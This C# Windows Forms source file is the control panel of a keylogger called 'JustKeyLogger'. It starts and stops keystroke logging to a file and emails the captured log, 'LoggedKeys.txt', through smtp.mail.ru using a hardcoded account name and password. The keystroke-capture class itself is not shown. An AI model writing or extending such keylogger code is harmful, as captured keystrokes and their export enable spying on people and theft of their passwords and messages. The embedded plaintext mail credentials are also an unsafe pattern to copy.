using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Mail;
using System.Net;

namespace JustKeyLogger
{
    public partial class MainForm : Form
    {
        private bool isOn = false;

        public MainForm()
        {
            InitializeComponent();
        }

        private void MainForm_Load(object sender, EventArgs e)
        {
            LogFileDirectoryLocationTextBox.Text = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
        }

        private void LogFileInExplorerButton_Click(object sender, EventArgs e)
        {
            try
            {
                Process.Start(Path.GetDirectoryName(LogFileDirectoryLocationTextBox.Text));
            }
            catch(Exception exception)
            {
                MessageBox.Show(exception.Message);
            }
        }

        private void LogFileBrowseButton_Click(object sender, EventArgs e)
        {
            FolderBrowserDialog browser = new FolderBrowserDialog();

            if (browser.ShowDialog() == DialogResult.OK)
            {
                LogFileDirectoryLocationTextBox.Text = browser.SelectedPath;
            }

        }

        private void StartButton_Click(object sender, EventArgs e)
        {
            if(!isOn)
            {
                if(!Directory.Exists(LogFileDirectoryLocationTextBox.Text))
                {
                    MessageBox.Show("Such Directory does not Exist");
                    return;
                }

                Logger.Start(LogFileDirectoryLocationTextBox.Text);
                StatusLabel.Text = "Status: ON";
                isOn = true;
            }
        }

        private void StopButton_Click(object sender, EventArgs e)
        {
            if(isOn)
            {
                Logger.Stop();
                StatusLabel.Text = "Status: OFF";
                isOn = false;
            }
        }

        private void SendEmailButton_Click(object sender, EventArgs e)
        {
            if(isOn)
            {
                MessageBox.Show("Please turn logger off first.");
                return;
            }
            else if (!File.Exists(LogFileDirectoryLocationTextBox.Text + @"\LoggedKeys.txt"))
            {
                MessageBox.Show("Can't find Logged file");
                return;
            }
            else if(!EmailIsValid(EmailTextBox.Text))
            {
                MessageBox.Show("Please input valid Email address");
                return;
            }

            SendEmail(LogFileDirectoryLocationTextBox.Text + @"\LoggedKeys.txt", EmailTextBox.Text);
        }

        private static void SendEmail(string logFileLocation, string toEmail)
        {
            try
            { 
                SmtpClient client = new SmtpClient();
                client.Host = "smtp.mail.ru";
                client.Port = 587;
                client.EnableSsl = true;
                client.Credentials = new NetworkCredential("JustKeyLogger@mail.ru", "JustLogger123");

                MailMessage message = new MailMessage("JustKeyLogger@mail.ru", toEmail, "Key Log File", "Thanks for using Just Key Logger");
                message.BodyEncoding = System.Text.Encoding.UTF8;

                message.Attachments.Add(new Attachment(logFileLocation));

                client.Send(message);
            }
            catch (Exception e)
            {
                MessageBox.Show("MainForm.SendEmail: " + e.Message);
            }
        }

        private static bool EmailIsValid(string address)
        {
            try
            {
                MailAddress a = new MailAddress(address);
                return a.Address == address;
            }
            catch
            {
                return false;
            }
        }
    }
}
